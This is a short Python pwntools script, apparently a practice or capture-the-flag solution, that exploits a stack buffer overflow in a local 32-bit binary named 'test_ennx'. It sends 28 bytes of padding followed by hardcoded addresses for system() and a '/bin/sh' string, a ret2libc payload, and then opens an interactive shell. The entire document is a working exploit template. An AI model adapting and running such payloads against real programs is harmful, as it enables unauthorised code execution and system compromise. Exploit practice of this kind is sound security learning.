from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')

p = process("./test_ennx")


system_addr = 0x62bf00
bin_sh_addr = 0x747b65
saved_eip = 0x607d28

p.recvline()
payload = 'A'* 28 +  p32(system_addr) + p32(saved_eip) + p32(bin_sh_addr)
p.sendline(payload)
#p.recvall()
p.interactive()
p.close()


